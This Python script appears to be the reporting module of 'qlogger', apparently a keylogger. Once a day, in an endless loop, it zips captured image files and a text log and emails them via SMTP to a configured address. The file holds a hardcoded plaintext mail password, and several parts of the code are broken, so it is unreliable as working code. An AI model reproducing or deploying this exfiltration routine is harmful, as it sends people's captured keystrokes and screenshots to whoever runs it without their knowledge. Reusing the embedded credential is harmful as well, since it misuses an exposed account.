# AUTHOR: https://github.com/akcware/
# You can reach up-to-date version on https://github.com/akcware/qlogger

import os
import zipfile
import smtplib
import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from email.utils import formatdate

daily_reset = False  # If you want to reset your logs after sent mail, set True this variable.

sender = 'qloggerbot@yandex.com'
# receivers = [''] ? When you finished your configures, activate this line
receivers = sender  # If you want to test it, you should use this line to send yourself. Else deactivate this line.
subject = 'Daily Logs'
smtphost = 'smtp.yandex.com.tr'
smtpport = 465
password = 'iyamjkxtpkwwbtje'

message = """
Hi {0},

Your logs for today are ready. You can access to attachments and read logs.
""".format(sender)

last_sent = datetime.date(2020, 1, 2)

with open("last_sent.txt", "w+") as ls:
    if ls.read() == "":
        last_sent = datetime.datetime.now()
        ls.write(last_sent.strftime("%m/%d/%Y, %H:%M:%S"))
    else:
        last_sent = datetime.datetime.strptime(ls.read(), '%m-%d-%Y').date()


def zip_folder():
    zf = zipfile.ZipFile("logs_compressed.zip", "w")
    for dirname, subdirs, files in os.walk("imgs"):
        zf.write(dirname)
        for filename in files:
            zf.write(os.path.join(dirname, filename))
    zf.close()


# Sending Mails
def send_mails():
    try:
        zip_folder()

        msg = MIMEMultipart()
        msg['Subject'] = subject
        msg['From'] = sender
        msg['Message'] = message  # ? Not sure is it working
        msg['Date'] = formatdate(localtime=True)

        part = MIMEBase('application', "octet-stream")
        part.set_payload(open("qlog.txt", "rb").read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="qlog.txt"')

        msg.attach(part)

        part = MIMEBase('application', "octet-stream")
        part.set_payload(open("logs_compressed.zip", "rb").read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="logs_compressed.zip"')

        msg.attach(part)

        mail = smtplib.SMTP_SSL(smtphost, smtpport)
        mail.ehlo()
        mail.login(sender, password)
        mail.sendmail(sender, receivers, msg.as_string())
        mail.quit()

        if daily_reset:  # If you turn on daily reset software will delete all images and logs after mail sent.
            os.remove("qlog.txt")
            os.remove("imgs")

        print('Success')

    except smtplib.SMTPException:
        print('ERROR: Unable to send mail')


while True:
    if last_sent.day >= 28 and last_sent.month < datetime.datetime.now().month:
        send_mails()
        last_sent = datetime.datetime.now()
        with open("last_sent.txt", "a") as ls:
            ls.write(str(last_sent))

    elif last_sent.day < datetime.datetime.now().day:
        send_mails()
        last_sent = datetime.datetime.now()
        with open("last_sent.txt", "a") as ls:
            ls.write(str(last_sent))
